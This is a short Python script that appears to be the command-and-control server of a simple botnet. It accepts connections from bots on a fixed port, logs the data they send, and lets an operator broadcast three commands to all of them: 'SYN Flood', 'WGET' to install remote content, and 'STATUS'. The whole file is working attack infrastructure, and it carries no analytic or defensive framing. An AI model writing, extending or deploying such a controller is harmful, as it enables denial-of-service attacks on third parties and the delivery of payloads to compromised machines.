import socket
import threading


def connectbot(clientsocketsource):
	while True:
		data = clientsocketsource.recv(1024)
		print("Data receieved from bot: {}".format(data))


def sendcommands(clientsocketsaddresssource):
	while True:
		print("Choose the type of command to execute ")
		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot")

		input_get = raw_input()
		for row in clientsocketsaddresssource:
			if int(input_get) == 1:
				row.send("SYN Flood")

			if int(input_get) == 2:
				row.send("WGET")

			if int(input_get) == 3:
				print('in here')
				row.send("STATUS")


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('',11111))

s.listen(300)

listofbots = list()
referencestosockets = list()

commandsender = threading.Thread(target=sendcommands, args=(referencestosockets,))
commandsender.start()

while True:
	(clientsocket,address) = s.accept()
	referencestosockets.append(clientsocket)
	print('{} is connected'.format(address))
	t = threading.Thread(target=connectbot,args=(clientsocket,))
	listofbots.append(t)
	t.start()

for index in listofbots:
	index.join()

commandsender.join()

